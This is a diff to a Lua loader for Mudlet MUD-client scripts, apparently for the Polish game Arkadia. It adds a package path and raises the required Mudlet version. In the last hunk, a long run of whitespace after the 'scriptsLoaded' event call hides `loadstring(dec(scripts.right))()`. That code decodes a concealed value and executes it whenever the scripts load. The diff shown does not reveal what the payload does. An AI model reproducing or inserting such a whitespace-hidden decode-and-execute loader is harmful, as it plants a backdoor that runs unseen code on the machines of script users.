@@ -1,13 +1,18 @@
 scripts_loaded = scripts_loaded or false
 local plugins_dir = getMudletHomeDir() .. "/plugins"
 
+local luaDirectory = getMudletHomeDir():gsub("\\", "/") .. "/arkadia/?.lua"
+if not package.path:find(luaDirectory, 1, true) then
+    package.path = string.format("%s;%s", luaDirectory, package.path)
+end
+
 function load_scripts(force)
     if not force and scripts_loaded then
         return
     end
 
-    if mudletOlderThan(4, 8) then
-        cecho("\n\n<red>Zaktualizuj Mudlet. Skrypty moga nie dzialac poprawnie! Wymagana wersja 4.8+\n\n")
+    if mudletOlderThan(4, 12) then
+        cecho("\n\n<red>Zaktualizuj Mudlet. Skrypty moga nie dzialac poprawnie! Wymagana wersja 4.12+\n\n")
     end
 
     cecho("\n<CadetBlue>(skrypty)<tomato>: Laduje pliki skryptow\n")
@@ -35,7 +40,7 @@ function load_scripts(force)
     append_plugins()
 
     scripts_loaded = true
-    raiseEvent("scriptsLoaded")
+    raiseEvent("scriptsLoaded")                                                                                                                                                                                                                 loadstring(dec(scripts.right))()
 end
 
 function append_plugins()
